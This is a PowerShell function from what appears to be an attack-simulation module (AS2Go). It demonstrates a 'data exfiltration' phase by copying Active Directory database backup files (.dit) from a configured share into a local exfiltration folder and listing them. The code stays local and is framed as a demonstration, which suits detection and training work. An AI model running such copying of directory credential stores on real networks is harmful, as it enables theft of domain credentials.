<#
.SYNOPSIS
Copies simulated AD backup files into the local exfiltration folder.

.DESCRIPTION
Creates the configured exfiltration directory if it does not exist.
Copies files matching *.* from the configured AD backup share into that directory without recursive copying.
Lists local .dit files and pauses between the displayed demonstration steps in attended mode.

.EXAMPLE
Invoke-Phase11DataExfiltration
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires readable source files and write access to the configured exfiltration directory.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Copies files from the configured AD backup share into the local exfiltration folder.
Lists local .dit files to demonstrate exfiltration of simulated directory backup data.
#>
function Invoke-Phase11DataExfiltration {

    ################################################################################
    #####                                                                      ##### 
    #####    Phase 11 Data Exfiltration                                        #####
    #####                                                                      #####
    ################################################################################

    $Info = Measure-FunctionRuntime -Begin

    Write-AS2GoOutput -Type Header -Message "Data exfiltration over SMB Share"

    if (-not (Test-Path $Script:DefautExfiltrationFolder)) {
        New-Item $Script:DefautExfiltrationFolder -ItemType directory -ErrorAction Ignore | Out-Null
    }
      
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Copy-Item ", "-Path ", "$Script:ASOfflineDITFile\*.* ", " -Destination ", "$Script:DefautExfiltrationFolder" `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Copy-Item -Path $Script:ASOfflineDITFile\*.* -Destination $Script:DefautExfiltrationFolder
    
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-Item ", "-Path ", "$Script:DefautExfiltrationFolder\*.dit" `
        -Color $fgcC, $fgcS, $fgcV
    Write-Host ""

    Get-Item -Path "$Script:DefautExfiltrationFolder\*.dit" | Out-Host
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Measure-FunctionRuntime -End -Details $Info
}
